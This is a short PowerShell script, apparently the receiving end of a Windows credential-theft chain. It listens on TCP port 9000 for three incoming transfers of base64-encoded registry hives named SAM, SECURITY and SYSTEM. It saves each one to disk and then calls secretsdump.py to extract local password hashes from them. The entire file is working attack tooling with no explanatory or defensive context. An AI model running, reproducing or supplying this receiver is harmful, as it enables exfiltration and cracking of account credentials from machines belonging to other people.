function Invoke-Reciever {
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
    $listener = new-object System.Net.Sockets.TcpListener $endpoint
    $listener.start()
    Write-Host Waiting For Connection...
    $client = $listener.AcceptTcpClient()
    Write-Host Starting Data Processing...
    $stream = $client.GetStream()
    $byte1 = New-Object byte[] 1000000
    $bytes1 = $stream.read($byte1, 0, $byte1.Length)
    $msg1 += [text.encoding]::ASCII.GetString( (1..$bytes1 | ForEach-Object { $byte1[$_-1] } ) )
    [IO.File]::WriteAllBytes('.\SAM', [Convert]::FromBase64String($msg1))
    Write-Host Processed SAM
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $byte2 = New-Object byte[] 1000000
    $bytes2 = $stream.read($byte2, 0, $byte2.Length)
    $msg2 += [text.encoding]::ASCII.GetString( (1..$bytes2 | ForEach-Object { $byte2[$_-1] } ) )
    [IO.File]::WriteAllBytes('.\SECURITY', [Convert]::FromBase64String($msg2))
    Write-Host Processed SECURITY
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $byte3 = New-Object byte[] 50000000
    $bytes3 = $stream.read($byte3, 0, $byte3.Length)
    $msg3 += [text.encoding]::ASCII.GetString( (1..$bytes3 | ForEach-Object { $byte3[$_-1] } ) )
    [IO.File]::WriteAllBytes('.\SYSTEM', [Convert]::FromBase64String($msg3))
    Write-Host Processed SYSTEM
    Write-Host Finished Processing
    $listener.Stop()
    $listener.Server.Dispose()
    Write-Host Dumping Hashes With secretsdump.py
    .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
}
Invoke-Reciever